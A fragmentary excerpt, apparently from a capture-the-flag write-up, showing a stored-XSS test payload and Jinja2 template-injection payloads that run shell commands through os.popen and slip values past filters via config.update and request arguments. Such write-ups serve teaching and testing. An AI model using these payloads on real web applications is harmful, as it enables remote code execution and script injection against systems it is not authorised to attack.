...
`<script>alert('Vote for Greg! :)')</script>`. After voting for the second, other users
...
>\{\{lipsum.\__globals\__.os.popen('ls').read()\}\}
...
>\{\{lipsum.\__globals\__.os.popen(config.y).read()\}\}
...
>\{&#37;print(config.update(a=request.args.a))&#37;\}&a=\__globals\__
